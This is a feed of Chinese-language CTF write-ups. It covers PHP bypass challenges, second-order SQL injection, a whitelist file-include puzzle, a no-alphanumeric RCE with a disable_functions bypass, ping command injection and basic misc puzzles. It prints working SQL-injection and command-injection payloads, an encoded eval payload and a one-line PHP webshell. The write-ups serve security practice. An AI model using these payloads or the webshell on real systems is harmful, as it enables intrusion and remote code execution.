&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;md5&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $md5&lt;span style="color:#f92672">=&lt;/span>$_GET[&lt;span style="color:#e6db74">&amp;#39;md5&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ($md5&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#a6e22e">md5&lt;/span>($md5))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;去非洲吧&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//get flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;get_flag&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $get_flag &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;get_flag&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">strstr&lt;/span>($get_flag,&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $get_flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_ireplace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;cat&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wctf2020&amp;#34;&lt;/span>, $get_flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>($get_flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;快到非洲了&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;去非洲吧&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一关一关的&lt;strong>bypass&lt;/strong>。&lt;/p></description></item><item><title>SWPU2019 Web1</title><link>/posts/ctf/swpu2019web1/</link><pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate><guid>/posts/ctf/swpu2019web1/</guid><description>&lt;p>一个登陆界面，再看下url地址为login.php，确认了使用的是php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091617.png" alt="">&lt;/p>
&lt;p>直接查看源码，在源码中找到了register.php。先注册一个进去看一看。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091705.png" alt="">&lt;/p>
&lt;p>是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号&lt;code>'&lt;/code>试一试&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091924.png" alt="">&lt;/p>
&lt;p>广告详情中出现了数据库报错&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091959.png" alt="">猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是&lt;strong>字符型单引号闭合&lt;/strong>。&lt;/p>
&lt;p>接下来是尝试过滤。我试出来的有空格（使用&lt;code>/**/&lt;/code>绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库&lt;strong>information_schema&lt;/strong>没有办法查询，并且&lt;strong>orderby&lt;/strong>也不能使用，需要使用其他办法获取表内容。&lt;/p>
&lt;p>测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 &lt;code>LIMIT 0,1&lt;/code>需要闭合，所以最后添加了一个单引号&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415092716.png" alt="">&lt;/p>
&lt;p>说明回显位是2和3。&lt;/p>
&lt;p>由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。&lt;del>这种没有办法查询表名的题目表名应该都不会设置太难&lt;/del>&lt;/p>
&lt;p>测试的语句&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当测到&lt;code>users&lt;/code>表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&lt;/p>
&lt;p>首先讲解一波&lt;strong>无列名注入&lt;/strong>。&lt;/p>
&lt;p>先来个正常表（flag）的查询&lt;/p>
&lt;p>&lt;img src="D:%5CDROPS%5CCTF%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3%5CBUUCTF%5CWeb%5BSWPU2019%5DWeb1%5C20210415094632.png" alt="">&lt;/p>
&lt;p>我们知道在sql语句查询的时候，可以给列名起别名形如&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094059.png" alt="">&lt;/p>
&lt;p>使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094238.png" alt="">&lt;/p>
&lt;p>所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094814.png" alt="">&lt;/p>
&lt;p>需要为子查询的结果再起一个别名（图中为&lt;code>x&lt;/code>），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用&lt;code>group_concat&lt;/code>函数输出自己构造的表名。&lt;/p>
&lt;p>所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&lt;/p>
&lt;p>最终的payload：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>BUUCTF寒假刷题-Web</title><link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p>寒假横向刷题（尽量）
&lt;a href="https://buuoj.cn/challenges#">BUUCTF&lt;/a>
💗🧡💛💚💙💜🤎🖤🤍
&lt;strong>题都写这一个里面了，可以先用&lt;!-- raw HTML omitted -->Ctrl&lt;!-- raw HTML omitted -->+&lt;!-- raw HTML omitted -->F&lt;!-- raw HTML omitted -->搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong>&lt;/p>
&lt;h1 id="20210115">2021.01.15&lt;/h1>
&lt;h1 id="hctf-2018warmup">[HCTF 2018]WarmUp&lt;/h1>
&lt;p>进到靶机一个硕大的滑稽，查看源码有提示source.php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png" alt="">&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
 highlight_file(__FILE__);
 class emmm
 {
 public static function checkFile(&amp;amp;$page)
 {
 $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
 if (! isset($page) || !is_string($page)) {
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }

 if (in_array($page, $whitelist)) {
 return true;
 }

 $_page = mb_substr(
 $page,
 0,
 mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }

 $_page = urldecode($page);
 $_page = mb_substr(
 $_page,
 0,
 mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }
 }

 if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
 ) {
 include $_REQUEST[&amp;#39;file&amp;#39;];
 exit;
 } else {
 echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
 } 
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>发现白名单有source.php和hint.php，先去查看一下hint.php&lt;/p></description></item><item><title>极客大挑战 2019 RCE ME</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME&lt;/h1>
&lt;p>源码：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
 $code=$_GET[&amp;#39;code&amp;#39;];
 if(strlen($code)&amp;gt;40){
 die(&amp;#34;This is too Long.&amp;#34;);
 }
 if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
 die(&amp;#34;NO.&amp;#34;);
 }
 @eval($code);
}
else{
 highlight_file(__FILE__);
}

// ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>分析一波，GET请求获得&lt;code>code&lt;/code>，想要通过的话需要绕过两个检测：&lt;/p>
&lt;ol>
&lt;li>payload长度小于40&lt;/li>
&lt;li>不能包含&lt;code>a-z、A-Z、0-9&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell&lt;/a>，这次摸到了相关文章：&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇&lt;/a>。&lt;/p>
&lt;p>使用&lt;code>url编码&lt;/code>+&lt;code>~&lt;/code>取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code>($a)()&lt;/code>这样的方法动态执行函数，所以我们可以构造payload：&lt;code>assert(eval($_POST[‘a’]))&lt;/code>&lt;/p>
&lt;p>先构造&lt;code>assert&lt;/code>：&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;assert&amp;#39;);

//结果：%9E%8C%8C%9A%8D%8B
&lt;/code>&lt;/pre>&lt;p>再构造&lt;code>eval($_POST['a'])&lt;/code>：&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);

//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code>&lt;/pre>&lt;p>完整payload：&lt;/p>
&lt;pre tabindex="0">&lt;code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code>&lt;/pre>&lt;p>网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code>~&lt;/code>取反再获得真正的函数名。&lt;/p>
&lt;p>使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code>ELF&lt;/code>是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code>ret=127&lt;/code>：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png" alt="">&lt;/p>
&lt;p>搜索了一波，原来是是&lt;strong>disable_function&lt;/strong>搞的鬼，这个表可以在phpinfo()中查看：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png" alt="">&lt;/p>
&lt;p>因为&lt;code>system&lt;/code>、&lt;code>exec&lt;/code>、&lt;code>shell_exec&lt;/code>等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong>disable_function&lt;/strong>的方法，网上有很多其他方法，其中一个方法：&lt;/p>
&lt;p>&lt;strong>利用环境变量LD_PRELOAD来绕过&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p>
&lt;p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p>
&lt;/blockquote>
&lt;p>正好蚁剑的插件中就有一个名为：&lt;a href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions&lt;/a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png" alt="">&lt;/p>
&lt;p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code>/var/www/html&lt;/code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png" alt="">&lt;/p>
&lt;blockquote>
&lt;p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p>
&lt;/blockquote>
&lt;p>上传一句话木马233.php：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code>&lt;/pre>&lt;p>再用一句话木马的shell执行插件：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png" alt="">&lt;/p>
&lt;p>进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png" alt="">&lt;/p>
&lt;p>再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png" alt="">&lt;/p>
&lt;p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p></description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping&lt;/h1>
&lt;p>题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p>
&lt;p>和DMCTF做的那道&lt;strong>pingpingping&lt;/strong>类似，同样是使用管道符构造payload，先使用：&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=127.0.0.1|ls
&lt;/code>&lt;/pre>&lt;p>目录下有两个文件：&lt;code>flag.php&lt;/code>、&lt;code>index.php&lt;/code>。首先试出来了空格被过滤，使用以下绕过空格：&lt;/p>
&lt;pre tabindex="0">&lt;code>$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt; 
&amp;lt;&amp;gt; 
{cat,flag.php} //用逗号实现了空格功能
%20 
%09 
&lt;/code>&lt;/pre>&lt;p>在linux下反单引号里面的指令会被执行 &lt;strong>`ls`&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>会输出该目录下所有可以打开的文件，可以查看&lt;strong>index.php&lt;/strong>的部分源码有哪些过滤：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#a6e22e">ip&lt;/span>&lt;span style="color:#f92672">=|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your symbol!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/ /&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your space!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bash/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your bash!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your flag!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">shell_exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ping -c 4 &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$ip);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print_r&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问&lt;strong>flag.php&lt;/strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用&lt;strong>readflag&lt;/strong>的ELF执行文件访问，但是还没成功。其实执行：&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;!-- raw HTML omitted -->我是傻逼&lt;!-- raw HTML omitted -->。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p></description></item><item><title>DMCTF之Misc</title><link>/posts/ctf/dmctf%E4%B9%8Bmisc/</link><pubDate>Tue, 01 Dec 2020 11:20:45 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bmisc/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>这次比赛是第一次做Mics的题awa。&lt;/p>
&lt;h1 id="misc">Misc&lt;/h1>
&lt;h2 id="check_in">Check_in&lt;/h2>
&lt;p>真·有手就行&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130102716.png" alt="">&lt;/p>
&lt;h2 id="fakezip">fakezip&lt;/h2>
&lt;p>看到题目&lt;strong>fakezip&lt;/strong>翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：&lt;a href="https://blog.csdn.net/u011377996/article/details/79286958">zip伪加密&lt;/a>，使用010 Editor打开压缩包，&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130103932.png" alt="">&lt;/p>
&lt;p>找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt&lt;/p>
&lt;p>打开以后内容是：&lt;code>♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=&lt;/code>，音符加密虽然是第一次听说，但是百度还是可以简单找到：&lt;a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130104321.png" alt="">&lt;/p>
&lt;h2 id="base-family">Base family&lt;/h2>
&lt;p>题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：&lt;code>base16&lt;/code>、&lt;code>base32&lt;/code>、&lt;code>base58&lt;/code>、&lt;code>base64&lt;/code>、&lt;code>base91&lt;/code>。还有几种没听过的base种类可以在这个网站找到：&lt;a href="http://ctf.ssleye.com/">CTF在线工具&lt;/a>。&lt;/p>
&lt;p>&lt;strong>原层&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&amp;#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&amp;amp;GP&amp;lt;Rk:o_Jk&amp;lt;J.zp8%H0g7sYSTJ9p.&amp;#34;duRBGj`g0!I+xjm(fh)]IF:&amp;gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=&amp;lt;D
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base91解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW
